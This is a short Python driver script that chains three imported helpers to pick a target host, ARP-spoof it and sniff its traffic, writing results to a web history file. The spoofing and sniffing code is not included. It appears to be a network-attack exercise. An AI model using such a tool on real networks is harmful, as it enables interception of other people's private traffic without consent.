from e1.run import select_target_host
from e2.arp import perform_arp_spoof
from e3.sniifer import sniff

def main():
    with open("web_history.html", "w") as f:
        f.write("")

    ########## 1 ##########
    target_host = select_target_host()

    ########## 2 ##########
    perform_arp_spoof(target_host)

    ########## 3 ##########
    sniff(target_host)


if __name__ == '__main__':
    main()
